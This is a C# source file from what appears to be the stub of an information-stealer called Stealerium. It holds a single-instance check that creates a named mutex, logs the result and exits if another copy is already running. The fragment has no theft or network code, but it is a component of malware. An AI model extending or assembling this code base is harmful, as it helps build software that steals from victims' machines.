using Stealerium.Stub.Helpers;
using System;
using System.Threading;

namespace Stealerium.Stub.Modules.Implant
{
    internal sealed class MutexControl
    {
        // Mutex instance to prevent multiple instances of the application
        private static Mutex _mutex;

        /// <summary>
        /// Checks if the application is already running. If so, it exits the current instance.
        /// </summary>
        public static void Check()
        {
            try
            {
                Logging.Log($"MutexControl: Attempting to create mutex with name: {Config.Mutex}");
                
                // Attempt to create a mutex with the specified name from the configuration
                _mutex = new Mutex(true, Config.Mutex, out bool mutexCreated);

                if (!mutexCreated)
                {
                    Logging.Log("MutexControl: Another instance is already running. Exiting.");
                    // If another instance is running, terminate this instance
                    Environment.Exit(0);
                }
                
                Logging.Log("MutexControl: Successfully created mutex.");
            }
            catch (Exception ex)
            {
                // Log any potential errors in creating or managing the mutex
                Logging.Log($"MutexControl: Failed to check mutex. Error: {ex.Message}");

                // In case of failure, safely terminate the application to prevent multiple instances
                Environment.Exit(0);
            }
        }
    }
}
